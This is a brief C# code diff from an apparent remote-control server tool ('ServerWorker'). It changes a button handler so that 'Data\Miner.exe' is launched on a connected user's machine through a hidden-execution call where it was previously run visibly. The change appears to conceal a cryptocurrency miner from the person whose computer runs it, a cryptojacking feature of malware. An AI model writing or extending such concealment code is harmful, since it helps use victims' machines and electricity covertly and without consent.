@@ -135,7 +135,7 @@ namespace ServerWorker
 
         private void button4_Click_1(object sender, EventArgs e)
         {
-            user.UsersCom.RunProgram(@"Data\Miner.exe");
+            user.UsersCom.RunHideProgram(@"Data\Miner.exe");
         }
 
         private void button5_Click(object sender, EventArgs e)
